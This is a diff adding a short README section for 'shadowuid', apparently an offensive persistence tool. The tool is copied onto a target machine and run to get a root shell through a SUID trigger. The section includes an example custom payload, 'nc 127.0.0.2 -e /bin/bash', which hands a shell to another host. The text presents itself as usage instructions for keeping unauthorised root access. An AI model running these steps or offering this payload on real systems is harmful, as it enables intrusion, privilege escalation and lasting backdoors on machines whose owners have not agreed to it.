@@ -4,3 +4,19 @@
 Also a good way to learn Nim and something new
 </code></pre>
 </div>
+
+## Like at home 🏡 <sup>(persistance)</sup>
+
+* First transfer `shadowuid` on target
+* Run it!<br><pre><code>./shadowuid</code></pre>
+
+And that's all, obtaining root shell is obtained and process to obtain it again will be outputted 
+
+
+##### More granular
+
+You can specify which SUID will trigger your payload. And, obviously, you can also custom the payload.
+An example:
+```shell
+./shadowuid -x --command "nc 127.0.0.2 -e /bin/bash"
+```
